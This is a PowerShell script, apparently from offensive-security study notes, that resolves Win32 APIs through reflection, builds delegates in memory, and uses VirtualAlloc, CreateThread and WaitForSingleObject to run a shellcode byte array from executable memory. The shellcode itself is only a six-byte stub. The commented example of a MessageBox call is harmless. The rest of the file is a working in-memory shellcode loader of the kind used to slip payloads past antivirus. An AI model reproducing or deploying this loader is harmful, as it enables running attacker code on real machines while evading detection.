function LookupFunc{
	## moduleName could be user32.dll, and the functionName would be MessageBoxA from pervious example
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType{
	##first argument: the custom function arguments of the Win32 API given as array
	##Seccond argument: the custom function's return type
	Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
	
	##creates the custom assembly and defines the module and type inside of it.
	$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), `
	[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).`
	DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	
	##Set up constructor method
	$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).`
	SetImplementationFlags('Runtime, Managed')
	
	##Set up invoke method for the constructor
	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).`
	SetImplementationFlags('Runtime, Managed')
	
	return $type.CreateType()
}
##Now We can call MessageBox using the function,
#$MessageBoxA = LookupFunc user32.dll MessageBoxA
#$MessageBoxADelegateType = getDelegateType @([IntPtr], [String], [String], [int]) ([int])
#$MessageBox = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxA, $MessageBoxADelegateType)
#$MessageBox.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)

##Now Let's do this for our full memeory shell code method, we will need virtualAlloc, CreateThread, and WaitForSingleObject

##Search Kernel32.dll for Win32 VirtualAlloc, create custom delegate type, link, and invoke
$VirtualAllocAddr = LookupFunc kernel32.dll VirtualAlloc
$VirtualAllocDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegateType)

$lpMem = $VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

##Generate the shellcode in ps1 format, and choose 32 bit, due to powershell spawn 32-bit child process
##and copy the shellcode over 
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

##Create CreateThread
$CreateThreadAddr = LookupFunc kernel32.dll CreateThread
$CreateThreadDelegateType = getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegateType)
$hThread = $CreateThread.Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

## Create WaitForSingleObject
$WaitForSingleObjectAddr = LookupFunc kernel32.dll WaitForSingleObject
$WaitForSingleObjectDelegateType = getDelegateType @([IntPtr], [Int32]) ([Int])
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegateType)

##invoke wait until code executed 
$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)